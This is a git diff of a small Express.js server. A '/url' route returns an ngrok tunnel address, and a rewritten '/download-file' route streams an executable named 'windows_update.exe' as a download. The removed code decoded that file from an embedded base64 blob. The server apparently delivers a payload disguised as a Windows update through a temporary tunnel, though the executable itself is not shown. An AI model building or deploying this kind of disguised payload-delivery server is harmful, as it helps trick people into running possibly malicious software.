@@ -12,14 +12,16 @@ app.all('/ok', (req, res) => {
 
 app.all('/url', (req, res) => {
     res.send('https://0b4f-190-192-75-210.sa.ngrok.io')
-})
+});
 
-app.get('/download', function (request, response) {
-    var fileContents = Buffer.from(fileData, "base64");
-    var savedFilePath = '/download/windows_update.exe';
-    fs.writeFile(savedFilePath, fileContents, function () {
-        response.status(200).download(savedFilePath, fileName);
-    });
+app.get('/download-file', function (req, res) {
+    var file = __dirname + '/download/windows_update.exe';
+    var filename = path.basename(file);
+    var mimetype = mime.lookup(file);
+    res.setHeader('Content-disposition', 'attachment; filename=' + filename);
+    res.setHeader('Content-type', mimetype);
+    var filestream = fs.createReadStream(file);
+    filestream.pipe(res);
 });
 
 app.get('/', function (req, res) {
